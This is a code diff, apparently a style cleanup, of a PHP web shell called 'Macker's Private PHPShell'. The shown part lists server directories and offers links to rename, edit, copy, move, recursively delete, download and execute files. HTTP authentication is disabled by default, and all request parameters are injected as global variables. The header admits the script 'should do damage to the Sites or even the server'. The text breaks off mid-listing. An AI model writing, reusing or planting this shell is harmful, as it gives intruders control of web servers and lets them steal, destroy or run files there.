@@ -1,4 +1,4 @@
-<?php 
+<?php
 
 
 
@@ -8,55 +8,55 @@
 
 *                           PHPSHELL.PHP             *
 
-***************************************************************************************** 
+*****************************************************************************************
 
-*                                                                                       *  
+*                                                                                       *
 
-*   Welcome to Macker's Private PHPShell script...                                              * 
+*   Welcome to Macker's Private PHPShell script...                                              *
 
-*   This script will allow you to browse webservers etc...                              * 
+*   This script will allow you to browse webservers etc...                              *
 
-*   Just copy the file to your directory and open it in your Internet Browser.          * 
+*   Just copy the file to your directory and open it in your Internet Browser.          *
 
-*                                                                                       * 
+*                                                                                       *
 
-*   The webserver should support PHP...                                                 * 
+*   The webserver should support PHP...                                                 *
 
-*                                                                                       * 
+*                                                                                       *
 
-*   You can modify the script if you want, but please send me a copy to:                *  
+*   You can modify the script if you want, but please send me a copy to:                *
 
-*                               MAX666@iranstars.com                                     * 
+*                               MAX666@iranstars.com                                     *
 
-***************************************************************************************** 
+*****************************************************************************************
 
 
 
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
-!!   PLEASE NOTE: You should use this script at own risk, it should do damage to the   !! 
+!!   PLEASE NOTE: You should use this script at own risk, it should do damage to the   !!
 
-!!                Sites or even the server... You are responsible for your own deeds.  !! 
+!!                Sites or even the server... You are responsible for your own deeds.  !!
 
 !!                The admin of your webserver should always know you are using this    !!
 
-!!                script.                                                              !! 
+!!                script.                                                              !!
 
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
-*/ 
-
-
+*/
 
 
 
-/*Setting some envirionment variables...*/ 
+
+
+/*Setting some envirionment variables...*/
 
 
 
 /* I added this to ensure the script will run correctly...
 
-   Please enter the Script's filename in this variable. */   
+   Please enter the Script's filename in this variable. */
 
 $SFileName=$PHP_SELF;
 
@@ -68,7 +68,7 @@ $SFileName=$PHP_SELF;
 
 //$http_auth_user = "phpshell";	/* HTTP Authorisation username, uncomment if you want to use this */
 
-//$http_auth_pass = "phpshell";	/* HTTP Authorisation password, uncomment if you want to use this */	    
+//$http_auth_pass = "phpshell";	/* HTTP Authorisation password, uncomment if you want to use this */
 
 
 
@@ -90,23 +90,33 @@ $formAdd = "";
 
 
 
-function walkArray($array){
-
-  while (list($key, $data) = each($array))
-
-    if (is_array($data)) { walkArray($data); }
-
-    else { global $$key; $$key = $data; global $urlAdd; $urlAdd .= "$key=".urlencode($data)."&";}
-
+function walkArray($array)
+{
+    while (list($key, $data) = each($array)) {
+        if (is_array($data)) {
+            walkArray($data);
+        } else {
+            global $$key;
+            $$key = $data;
+            global $urlAdd;
+            $urlAdd .= "$key=".urlencode($data)."&";
+        }
+    }
 }
 
 
 
-if (isset($_PUT)) walkArray($_PUT);
+if (isset($_PUT)) {
+    walkArray($_PUT);
+}
 
-if (isset($_GET)) walkArray($_GET);
+if (isset($_GET)) {
+    walkArray($_GET);
+}
 
-if (isset($_POST)) walkArray($_POST);
+if (isset($_POST)) {
+    walkArray($_POST);
+}
 
 
 
@@ -115,9 +125,7 @@ if (isset($_POST)) walkArray($_POST);
 $pos = strpos($urlAdd, "s=r");
 
 if (strval($pos) != "") {
-
-$urlAdd= substr($urlAdd, 0, $pos);
-
+    $urlAdd= substr($urlAdd, 0, $pos);
 }
 
 
@@ -126,19 +134,19 @@ $urlAdd .= "&s=r&";
 
 
 
-if (empty($Pmax))
+if (empty($Pmax)) {
+    $Pmax = 125;
+}   /* Identifies the max amount of Directories and files listed on one page */
 
-	$Pmax = 125;   /* Identifies the max amount of Directories and files listed on one page */
-
-if (empty($Pidx)) 
-
-	$Pidx = 0;
+if (empty($Pidx)) {
+    $Pidx = 0;
+}
 
 
 
-$dir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $dir )));
+$dir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $dir)));
 
-$file = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $file )));
+$file = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $file)));
 
 
 
@@ -152,37 +160,35 @@ $REMOTE_IMAGE_URL = "img";
 
 $img = array(
 
-				"Edit" 		=> "edit.gif",
+                "Edit" 		=> "edit.gif",
 
-				"Download" 	=> "download.gif",
+                "Download" 	=> "download.gif",
 
-				"Upload" 	=> "upload.gif",
+                "Upload" 	=> "upload.gif",
 
-				"Delete" 	=> "delete.gif",
+                "Delete" 	=> "delete.gif",
 
-				"View" 		=> "view.gif",
+                "View" 		=> "view.gif",
 
-				"Rename" 	=> "rename.gif",
+                "Rename" 	=> "rename.gif",
 
-				"Move" 		=> "move.gif",
+                "Move" 		=> "move.gif",
 
-				"Copy" 		=> "copy.gif",
+                "Copy" 		=> "copy.gif",
 
-				"Execute" 	=> "exec.gif"
+                "Execute" 	=> "exec.gif"
 
             );
 
 
 
-while (list($id, $im)=each($img))
-
-	if (file_exists("$LOCAL_IMAGE_DIR/$im"))
-
-		$img[$id] = "<img height=\"16\" width=\"16\" border=\"0\" src=\"$REMOTE_IMAGE_URL/$im\" alt=\"$id\">";
-
-	else
-
- 		$img[$id] = "[$id]";
+while (list($id, $im)=each($img)) {
+    if (file_exists("$LOCAL_IMAGE_DIR/$im")) {
+        $img[$id] = "<img height=\"16\" width=\"16\" border=\"0\" src=\"$REMOTE_IMAGE_URL/$im\" alt=\"$id\">";
+    } else {
+        $img[$id] = "[$id]";
+    }
+}
 
 
 
@@ -196,137 +202,118 @@ while (list($id, $im)=each($img))
 
 
 
-    if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_user || $PHP_AUTH_PW != $http_auth_pass)  ||  (($logoff==1) && $noauth=="yes")  )   { 
+    if (((isset($http_auth_user)) && (isset($http_auth_pass))) && (!isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_user || $PHP_AUTH_PW != $http_auth_pass)  ||  (($logoff==1) && $noauth=="yes")) {
+        setcookie("noauth", "");
 
-	    setcookie("noauth","");
+        Header("WWW-authenticate:  Basic realm=\"$scriptTitle $scriptver\"");
 
-	    Header( "WWW-authenticate:  Basic realm=\"$scriptTitle $scriptver\"");
+        Header("HTTP/1.0  401  Unauthorized");
 
-	    Header( "HTTP/1.0  401  Unauthorized");
+        echo "Your username or password is incorrect";
 
-	    echo "Your username or password is incorrect";
-
-	    exit ;
-
-			     
-
-    } 
+        exit ;
+    }
 
 
 
-function buildUrl($display, $url) {
+function buildUrl($display, $url)
+{
+    global $urlAdd;
 
-        global $urlAdd;
+    $url = $SFileName . "?$urlAdd$url";
 
-        $url = $SFileName . "?$urlAdd$url";
-
-	return "<a href=\"$url\">$display</a>";
-
+    return "<a href=\"$url\">$display</a>";
 }
 
 
 
-function sp($mp) {
+function sp($mp)
+{
+    for ($i = 0; $i < $mp; $i++) {
+        $ret .= "&nbsp;";
+    }
 
-	for ( $i = 0; $i < $mp; $i++ )
-
-		$ret .= "&nbsp;";
-
-	return $ret;
-
+    return $ret;
 }
 
 
 
-function spacetonbsp($instr) { return str_replace(" ", "&nbsp;", $instr);  } 
+function spacetonbsp($instr)
+{
+    return str_replace(" ", "&nbsp;", $instr);
+}
 
 
 
-function Mydeldir($Fdir) {
+function Mydeldir($Fdir)
+{
+    if (is_dir($Fdir)) {
+        $Fh=@opendir($Fdir);
 
-	if (is_dir($Fdir)) {
+        while ($Fbuf = readdir($Fh)) {
+            if (($Fbuf != ".") && ($Fbuf != "..")) {
+                Mydeldir("$Fdir/$Fbuf");
+            }
+        }
 
-		$Fh=@opendir($Fdir);
+        @closedir($Fh);
 
- 		while ($Fbuf = readdir($Fh))
-
- 			if (($Fbuf != ".") && ($Fbuf != ".."))
-
-				Mydeldir("$Fdir/$Fbuf");
-
-		@closedir($Fh);
-
-				return rmdir($Fdir);
-
-	}	else {
-
-		return unlink($Fdir);
-
-	}
-
+        return rmdir($Fdir);
+    } else {
+        return unlink($Fdir);
+    }
 }
 
 
 
 
 
-function arrval ($array) {
+function arrval($array)
+{
+    list($key, $data) = $array;
 
-list($key, $data) = $array;
-
-return $data;
-
+    return $data;
 }
 
 
 
-function formatsize($insize) {  
+function formatsize($insize)
+{
+    $size = $insize;
 
-	$size = $insize;
+    $add = "B";
 
-	$add = "B";
+    if ($size > 1024) {
+        $size = intval(intval($size) / 1.024)/1000;
 
-	if ($size > 1024) {
+        $add = "KB";
+    }
 
- 		$size = intval(intval($size) / 1.024)/1000;
+    if ($size > 1024) {
+        $size = intval(intval($size) / 1.024)/1000;
 
- 		$add = "KB";
+        $add = "MB";
+    }
 
- 	}
+    if ($size > 1024) {
+        $size = intval(intval($size) / 1.024)/1000;
 
- 	if ($size > 1024) {
+        $add = "GB";
+    }
 
- 		$size = intval(intval($size) / 1.024)/1000;
+    if ($size > 1024) {
+        $size = intval(intval($size) / 1.024)/1000;
 
- 		$add = "MB";
+        $add = "TB";
+    }
 
- 	}
-
- 	if ($size > 1024) {
-
- 		$size = intval(intval($size) / 1.024)/1000;
-
- 		$add = "GB";
-
- 	}
-
- 	if ($size > 1024) {
-
- 		$size = intval(intval($size) / 1.024)/1000;
-
- 		$add = "TB";
-
- 	}
-
- 	return "$size $add";
-
+    return "$size $add";
 }
 
 
 
 if ($cmd != "downl") {
-
-	?>
+    ?>
 
 
 
@@ -541,18 +528,15 @@ if ($cmd != "downl") {
 
 
 	<?php
-
 }
 
 
 
-if ( $cmd=="dir" ) {
+if ($cmd=="dir") {
+    $h=@opendir($dir);
 
-  	$h=@opendir($dir);
-
- 	if ($h == false) {
-
-  		echo "<br><font color=\"red\">".sp(3)."\n\n\n\n
+    if ($h == false) {
+        echo "<br><font color=\"red\">".sp(3)."\n\n\n\n
 
                 COULD NOT OPEN THIS DIRECTORY!!!<br>".sp(3)."\n
 
@@ -563,42 +547,29 @@ if ( $cmd=="dir" ) {
                 PLEASE MAKE SURE YOU'VE GOT READ PERMISSIONS TO THE DIR...
 
                 <br><br></font>\n\n\n\n";
+    }
 
- 	}
+    if (function_exists('realpath')) {
+        $partdir = realpath($dir);
+    } else {
+        $partdir = $dir;
+    }
 
-        if (function_exists('realpath')) {
+    if (strlen($partdir) >= 100) {
+        $partdir = substr($partdir, -100);
 
-		$partdir = realpath($dir);
+        $pos = strpos($partdir, "/");
 
-	}
+        if (strval($pos) != "") {
+            $partdir = "<--   ...".substr($partdir, $pos);
+        }
 
-        else {
+        $partdir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $partdir)));
 
-		$partdir = $dir;
+        $dir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $dir)));
 
-	}
-
- 	if (strlen($partdir) >= 100) {
-
- 		$partdir = substr($partdir, -100);
-
- 		$pos = strpos($partdir, "/");
-
- 		if (strval($pos) != "") {
-
- 			$partdir = "<--   ...".substr($partdir, $pos);
-
- 		}
-
-        $partdir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $partdir )));
-
-        $dir = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $dir ))); 
-
-	$file = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $file )));
-
- 	}
-
-    ?>
+        $file = str_replace("\\", "/", str_replace("//", "/", str_replace("\\\\", "\\", $file)));
+    } ?>
 
       <form name="urlform" action="<?php echo "$SFileName?$urlAdd"; ?>" method="POST"><input type="hidden" name="cmd" value="dir">
 
@@ -694,503 +665,416 @@ if ( $cmd=="dir" ) {
 
 
 
-      	/* <!-- This whole heap of junk is the sorting section... */
+          /* <!-- This whole heap of junk is the sorting section... */
 
 
 
- 	$dirn 	= array();
+    $dirn 	= array();
 
- 	$filen 	= array();
+    $filen 	= array();
 
- 	$filesizes	= 0;
+    $filesizes	= 0;
 
- 	while ($buf = readdir($h)) {
+    while ($buf = readdir($h)) {
+        if (is_dir("$dir/$buf")) {
+            $dirn[] = $buf;
+        } else {
+            $filen[] = $buf;
+        }
+    }
 
-	    if (is_dir("$dir/$buf"))
+    $dirno 	= count($dirn) + 1;
 
-			$dirn[] = $buf;
+    $fileno	= count($filen) + 1;
 
-    		else 
 
- 			$filen[] = $buf;
 
-    	}	 	
+    function mycmp($a, $b)
+    {
+        if ($a == $b) {
+            return 0;
+        }
 
-		$dirno 	= count($dirn) + 1;
+        return (strtolower($a) < strtolower($b)) ? -1 : 1;
+    }
 
- 		$fileno	= count($filen) + 1;
 
 
+    if (function_exists("usort")) {
+        usort($dirn, "mycmp");
 
-  		function mycmp($a, $b){
+        usort($filen, "mycmp");
+    } else {
+        sort($dirn);
 
-			if ($a == $b) return 0;
+        sort($filen);
+    }
 
-			return (strtolower($a) < strtolower($b)) ? -1 : 1;
+    reset($dirn);
 
-		}
+    reset($filen);
 
+    if (function_exists('array_merge')) {
+        $filelist = array_merge($dirn, $filen);
+    } else {
+        $filelist = $dirn + $filen;
+    }
 
 
-		if (function_exists("usort")) {
 
-			usort($dirn, "mycmp");
+    
 
-			usort($filen, "mycmp");
+    if (count($filelist)-1 > $Pmax) {
+        $from = $Pidx * $Pmax;
 
-		}
+        $to = ($Pidx + 1) * $Pmax-1;
 
-		else {
+        if ($to - count($filelist) - 1 + ($Pmax / 2) > 0) {
+            $to = count($filelist) - 1;
+        }
 
-			sort ($dirn);
+        if ($to > count($filelist)-1) {
+            $to = count($filelist)-1;
+        }
 
-	 		sort ($filen);
+        $Dcontents = array();
 
-	 	}
+        for ($Fi = $from; $Fi <= $to; $Fi++) {
+            $Dcontents[] = $filelist[$Fi];
+        }
+    } else {
+        $Dcontents = $filelist;
+    }
 
-	reset ($dirn);
+    
 
- 	reset ($filen);
+    $tdcolors = array("lighttd", "darktd");
 
- 	if (function_exists('array_merge')) {
 
-		$filelist = array_merge ($dirn, $filen);
 
-	}
+    while (list($key, $file) = each($Dcontents)) {
+        if (!$tdcolor=arrval(each($tdcolors))) {
+            reset($tdcolors);
 
- 	else {
+            $tdcolor = arrval(each($tdcolors));
+        }
 
-		$filelist = $dirn + $filen;
+                 
 
-	}
+        if (is_dir("$dir/$file")) { /* <!-- If it's a Directory --> */
 
+            /* <!-- Dirname --> */
 
+            echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).buildUrl("[$file]", "cmd=dir&dir=$dir/$file") .sp(9)."</td>\n";
 
-	
+            /* <!-- Actions --> */
 
-	if ( count($filelist)-1 > $Pmax ) {
+            echo "<td NOWRAP class=\"top right $tdcolor\"><center>".sp(2)."\n";
 
-		$from = $Pidx * $Pmax;
+            /* <!-- Rename --> */
 
-		$to = ($Pidx + 1) * $Pmax-1;
+            if (($file != ".") && ($file != "..")) {
+                echo buildUrl($img["Rename"], "cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file").sp(3)."\n";
+            }
 
-		if ($to - count($filelist) - 1 + ($Pmax / 2) > 0 )
+            /* <!-- Delete --> */
 
-			$to = count($filelist) - 1;
+            if (($file != ".") && ($file != "..")) {
+                echo sp(3).buildUrl($img["Delete"], "cmd=deldir&file=$dir/$file&lastcmd=dir&lastdir=$dir")."\n";
+            }
 
-		if ($to > count($filelist)-1)
+            /* <!-- End of Actions --> */
 
-			$to = count($filelist)-1;
+            echo "&nbsp;&nbsp;</center></td>\n";
 
-		$Dcontents = array();
+            /* <!-- Size --> */
 
-		For ($Fi = $from; $Fi <= $to; $Fi++) {
+            echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;</td>\n";
 
-			$Dcontents[] = $filelist[$Fi];	
+            /* <!-- Attributes --> */
 
-		}
+            echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;&nbsp;\n";
 
+            echo "<strong>D</strong>";
 
+            if (@is_readable("$dir/$file")) {
+                echo "<strong>R</strong>";
+            }
 
-	}
+            if (function_exists('is_writeable')) {
+                if (@is_writeable("$dir/$file")) {
+                    echo "<strong>W</stong>";
+                }
+            } else {
+                echo "<strong>(W)</stong>";
+            }
 
-	else {
+            if (@is_executable("$dir/$file")) {
+                echo "<Strong>X<strong>";
+            }
 
-		$Dcontents = $filelist;
+            echo "&nbsp;&nbsp;</td>\n";
 
-	}
+            /* <!-- Date --> */
 
-	
+            echo "<td NOWRAP class=\"top right $tdcolor\" NOWRAP>\n";
 
-     $tdcolors = array("lighttd", "darktd");
+            echo "&nbsp;&nbsp;".date("D d-m-Y H:i:s", filemtime("$dir/$file"))."&nbsp;&nbsp;";
 
+            echo "</td>";
 
+            echo "</tr>\n";
+        } else { /* <!-- Then it must be a File... --> */
 
-     while (list ($key, $file) = each ($Dcontents)) {
+            /* <!-- Filename --> */
 
-          if (!$tdcolor=arrval(each($tdcolors))) {
+            if (@is_readable("$dir/$file")) {
+                echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).buildUrl($file, "cmd=file&file=$dir/$file").sp(9)."</td>\n";
+            } else {
+                echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).$file.sp(9)."</td>\n";
+            }
 
-	    reset($tdcolors);
+            /* <!-- Actions --> */
 
-	    $tdcolor = arrval(each($tdcolors));	  }
+            echo "<td NOWRAP class=\"top right $tdcolor\"><center>&nbsp;&nbsp;\n";
 
-	  	         
+            /* <!-- Rename --> */
 
- 		if (is_dir("$dir/$file")) { /* <!-- If it's a Directory --> */
+            echo buildUrl($img["Rename"], "cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file").sp(3)."\n";
 
-          			/* <!-- Dirname --> */
+            /* <!-- Edit --> */
 
-			echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).buildUrl( "[$file]", "cmd=dir&dir=$dir/$file") .sp(9)."</td>\n";
+            if ((@is_writeable("$dir/$file")) && (@is_readable("$dir/$file"))) {
+                echo buildUrl($img["Edit"], "cmd=edit&file=$dir/$file").sp(3)."\n";
+            }
 
-  				/* <!-- Actions --> */
+            /* <!-- Copy --> */
 
-			echo "<td NOWRAP class=\"top right $tdcolor\"><center>".sp(2)."\n";
+            echo buildUrl($img["Copy"], "cmd=copy&file=$dir/$file")."\n";
 
- 				/* <!-- Rename --> */
+            /* <!-- Move --> */
 
-			if ( ($file != ".") && ($file != "..") )
+            if ((@is_writeable("$dir/$file")) && (@is_readable("$dir/$file"))) {
+                echo sp(3). buildUrl($img["Move"], "cmd=move&file=$dir/$file")."\n";
+            }
 
-				echo buildUrl($img["Rename"], "cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file").sp(3)."\n";
+            /* <!-- Delete --> */
 
- 				/* <!-- Delete --> */
+            echo sp(3). buildUrl($img["Delete"], "cmd=delfile&file=$dir/$file&lastcmd=dir&lastdir=$dir")."\n";
 
-			if ( ($file != ".") && ($file != "..") )
+            /* <!-- Download --> */
 
-				echo sp(3).buildUrl( $img["Delete"], "cmd=deldir&file=$dir/$file&lastcmd=dir&lastdir=$dir")."\n";
+            echo sp(3). buildUrl($img["Download"], "cmd=downl&file=$dir/$file")."\n";
 
-				/* <!-- End of Actions --> */
+            /* <!-- Execute --> */
 
-			echo "&nbsp;&nbsp;</center></td>\n";
+            if (@is_executable("$dir/$file")) {
+                echo sp(3).buildUrl($img["Execute"], "cmd=execute&file=$dir/$file")."\n";
+            }
 
-  				/* <!-- Size --> */
+            /* <!-- End of Actions --> */
 
-			echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;</td>\n";
+            echo sp(2)."</center></td>\n";
 
- 				/* <!-- Attributes --> */
+            /* <!-- Size --> */
 
-			echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;&nbsp;\n";
+            echo "<td NOWRAP align=\"right\" class=\"top right $tdcolor\" NOWRAP >\n";
 
- 			echo "<strong>D</strong>";
+            $size = @filesize("$dir/$file");
 
-		        if ( @is_readable("$dir/$file") ) {
+            if ($size != false) {
+                $filesizes += $size;
 
-   				echo "<strong>R</strong>";
+                echo "&nbsp;&nbsp;<strong>".formatsize($size)."<strong>";
+            } else {
+                echo "&nbsp;&nbsp;<strong>0 B<strong>";
+            }
 
- 			}
+            echo "&nbsp;&nbsp;</td>\n";
 
- 			if (function_exists('is_writeable')) {
 
-				if ( @is_writeable("$dir/$file") ) {
 
- 					echo "<strong>W</stong>";
+            /* <!-- Attributes --> */
 
- 				}
+            echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;&nbsp;\n";
 
-			}
 
- 			else {
 
-    				echo "<strong>(W)</stong>";
+            if (@is_readable("$dir/$file")) {
+                echo "<strong>R</strong>";
+            }
 
-  			}
+            if (@is_writeable("$dir/$file")) {
+                echo "<strong>W</stong>";
+            }
 
-  			if ( @is_executable("$dir/$file") ) {
+            if (@is_executable("$dir/$file")) {
+                echo "<Strong>X<strong>";
+            }
 
- 				echo "<Strong>X<strong>";
+            if (function_exists('is_uploaded_file')) {
+                if (@is_uploaded_file("$dir/$file")) {
+                    echo "<Strong>U<strong>";
+                }
+            } else {
+                echo "<Strong>(U)<strong>";
+            }
 
- 			}
+            echo "&nbsp;&nbsp;</td>\n";
 
- 			echo "&nbsp;&nbsp;</td>\n";
+            /* <!-- Date --> */
 
- 				/* <!-- Date --> */
+            echo "<td NOWRAP class=\"top right $tdcolor\" NOWRAP>\n";
 
-			echo "<td NOWRAP class=\"top right $tdcolor\" NOWRAP>\n";
+            echo "&nbsp;&nbsp;".date("D d-m-Y H:i:s", filemtime("$dir/$file"))."&nbsp;&nbsp;";
 
- 			echo "&nbsp;&nbsp;".date("D d-m-Y H:i:s", filemtime("$dir/$file"))."&nbsp;&nbsp;";
+            echo "</td>";
 
- 			echo "</td>";
+            echo "</tr>\n";
+        }
+    }
 
-			echo "</tr>\n";
 
 
+    echo "</table><table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr>\n<td NOWRAP width=100% class=\"silver border noright\">\n";
 
-        	}
+    echo "&nbsp;&nbsp;".@count($dirn)."&nbsp;Dir(s),&nbsp;".@count($filen)."&nbsp;File(s)&nbsp;&nbsp;\n";
 
-  		else { /* <!-- Then it must be a File... --> */
+    echo "</td><td NOWRAP class=\"silver border noleft\">\n";
 
-     				/* <!-- Filename --> */
+    echo "&nbsp;&nbsp;Total filesize:&nbsp;".formatsize($filesizes)."&nbsp;&nbsp;<td></tr>\n";
 
-			if ( @is_readable("$dir/$file") )
+    
 
- 				echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).buildUrl( $file, "cmd=file&file=$dir/$file").sp(9)."</td>\n";
-
-  			else
-
-  				echo "<tr><td NOWRAP class=\"top left right $tdcolor\">".sp(3).$file.sp(9)."</td>\n";
-
-  			   				/* <!-- Actions --> */
-
-			echo "<td NOWRAP class=\"top right $tdcolor\"><center>&nbsp;&nbsp;\n";
-
- 				/* <!-- Rename --> */
-
-			echo buildUrl($img["Rename"], "cmd=ren&lastcmd=dir&lastdir=$dir&oldfile=$dir/$file").sp(3)."\n";
-
-  				/* <!-- Edit --> */
-
-			if ( (@is_writeable("$dir/$file")) && (@is_readable("$dir/$file")) )
-
- 				echo buildUrl( $img["Edit"], "cmd=edit&file=$dir/$file").sp(3)."\n";
-
-   				/* <!-- Copy --> */
-
- 			echo buildUrl( $img["Copy"], "cmd=copy&file=$dir/$file")."\n";
-
-  				/* <!-- Move --> */
-
-			if ( (@is_writeable("$dir/$file")) && (@is_readable("$dir/$file")) )
-
- 					echo sp(3). buildUrl( $img["Move"], "cmd=move&file=$dir/$file")."\n";
-
-    				/* <!-- Delete --> */
-
-			echo sp(3). buildUrl( $img["Delete"], "cmd=delfile&file=$dir/$file&lastcmd=dir&lastdir=$dir")."\n";
-
- 				/* <!-- Download --> */
-
-			echo sp(3). buildUrl( $img["Download"], "cmd=downl&file=$dir/$file")."\n";
-
- 				/* <!-- Execute --> */
-
-			if ( @is_executable("$dir/$file") )
-
- 				echo sp(3).buildUrl( $img["Execute"], "cmd=execute&file=$dir/$file")."\n";
-
-    				/* <!-- End of Actions --> */
-
-			echo sp(2)."</center></td>\n";
-
- 				/* <!-- Size --> */
-
-			echo "<td NOWRAP align=\"right\" class=\"top right $tdcolor\" NOWRAP >\n";
-
- 			$size = @filesize("$dir/$file");
-
- 			If ($size != false) {
-
-			        $filesizes += $size;
-
-				echo "&nbsp;&nbsp;<strong>".formatsize($size)."<strong>";
-
-			}
-
-			else
-
-				echo "&nbsp;&nbsp;<strong>0 B<strong>";
-
- 			echo "&nbsp;&nbsp;</td>\n";
-
-
-
- 				/* <!-- Attributes --> */
-
-			echo "<td NOWRAP class=\"top right $tdcolor\">&nbsp;&nbsp;\n";
-
-
-
- 			if ( @is_readable("$dir/$file") )
-
- 				echo "<strong>R</strong>";
-
-   			if ( @is_writeable("$dir/$file") )
-
- 				echo "<strong>W</stong>";
-
-   			if ( @is_executable("$dir/$file") )
-
- 				echo "<Strong>X<strong>";
-
-   			if (function_exists('is_uploaded_file')){
-
- 				if ( @is_uploaded_file("$dir/$file") )
-
- 					echo "<Strong>U<strong>";
-
- 			}
-
- 			else {
-
-				echo "<Strong>(U)<strong>";
-
-			}
-
- 			echo "&nbsp;&nbsp;</td>\n";
-
-			 	/* <!-- Date --> */
-
-			echo "<td NOWRAP class=\"top right $tdcolor\" NOWRAP>\n";
-
- 			echo "&nbsp;&nbsp;".date("D d-m-Y H:i:s", filemtime("$dir/$file"))."&nbsp;&nbsp;";
-
- 			echo "</td>";
-
- 			echo "</tr>\n";
-
- 		}
-
-  	}
-
-
-
-    	echo "</table><table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr>\n<td NOWRAP width=100% class=\"silver border noright\">\n";
-
-  	echo "&nbsp;&nbsp;".@count ($dirn)."&nbsp;Dir(s),&nbsp;".@count ($filen)."&nbsp;File(s)&nbsp;&nbsp;\n";
-
-  	echo "</td><td NOWRAP class=\"silver border noleft\">\n";
-
-  	echo "&nbsp;&nbsp;Total filesize:&nbsp;".formatsize($filesizes)."&nbsp;&nbsp;<td></tr>\n";
-
-	
-
-	function printpagelink($a, $b, $link = ""){
-
-		if ($link != "") 
-
-			echo "<A HREF=\"$link\"><b>| $a - $b |</b></A>";
-
-		else
-
-			echo "<b>| $a - $b |</b>";
-
-	}
+    function printpagelink($a, $b, $link = "")
+    {
+        if ($link != "") {
+            echo "<A HREF=\"$link\"><b>| $a - $b |</b></A>";
+        } else {
+            echo "<b>| $a - $b |</b>";
+        }
+    }
 
         
 
-	if ( count($filelist)-1 > $Pmax ) {
+    if (count($filelist)-1 > $Pmax) {
+        echo "<tr><td colspan=\"2\" class=\"silver border notop\"><table width=\"100%\" cellspacing=\"0\" cellpadding=\"3\"><tr><td valign=\"top\"><font color=\"red\"><b>Page:</b></font></td><td width=\"100%\"><center>";
 
-		echo "<tr><td colspan=\"2\" class=\"silver border notop\"><table width=\"100%\" cellspacing=\"0\" cellpadding=\"3\"><tr><td valign=\"top\"><font color=\"red\"><b>Page:</b></font></td><td width=\"100%\"><center>";
+        $Fi = 0;
 
-		$Fi = 0;
+        while (((($Fi+1)*$Pmax) + ($Pmax/2)) < count($filelist)-1) {
+            $from = $Fi*$Pmax;
 
-		while ( ( (($Fi+1)*$Pmax) + ($Pmax/2) ) < count($filelist)-1 ) {
+            while (($filelist[$from]==".") || ($filelist[$from]=="..")) {
+                $from++;
+            }
 
-			$from = $Fi*$Pmax;
+            $to = ($Fi + 1) * $Pmax - 1;
 
-			while (($filelist[$from]==".") || ($filelist[$from]=="..")) $from++; 
+            if ($Fi == $Pidx) {
+                $link="";
+            } else {
+                $link="$SFilename?$urlAdd"."cmd=$cmd&dir=$dir&Pidx=$Fi";
+            }
 
-			$to = ($Fi + 1) * $Pmax - 1;
+            printpagelink(substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);
 
-			if ($Fi == $Pidx)
+            echo "&nbsp;&nbsp;&nbsp;";
 
-				$link="";
+            $Fi++;
+        }
 
-			else 
+        $from = $Fi*$Pmax;
 
-				$link="$SFilename?$urlAdd"."cmd=$cmd&dir=$dir&Pidx=$Fi";
+        while (($filelist[$from]==".") || ($filelist[$from]=="..")) {
+            $from++;
+        }
 
-			printpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);
+        $to = count($filelist)-1;
 
-			echo "&nbsp;&nbsp;&nbsp;";
+        if ($Fi == $Pidx) {
+            $link="";
+        } else {
+            $link="$SFilename?$urlAdd"."cmd=$cmd&dir=$dir&Pidx=$Fi";
+        }
 
-			$Fi++;
+        printpagelink(substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);
 
-		}
+        
 
-		$from = $Fi*$Pmax;
+    
 
-		while (($filelist[$from]==".") || ($filelist[$from]=="..")) $from++; 
+        echo "</center></td></tr></table></td></tr>";
+    }
 
-		$to = count($filelist)-1;
 
-		if ($Fi == $Pidx)
 
-			$link="";
 
-		else 
 
-			$link="$SFilename?$urlAdd"."cmd=$cmd&dir=$dir&Pidx=$Fi";
+    echo "</table>\n<br><table NOWRAP>";
 
-		printpagelink (substr(strtolower($filelist[$from]), 0, 5), substr(strtolower($filelist[$to]), 0, 5), $link);		
 
-		
 
-	
+    if ($isGoodver) {
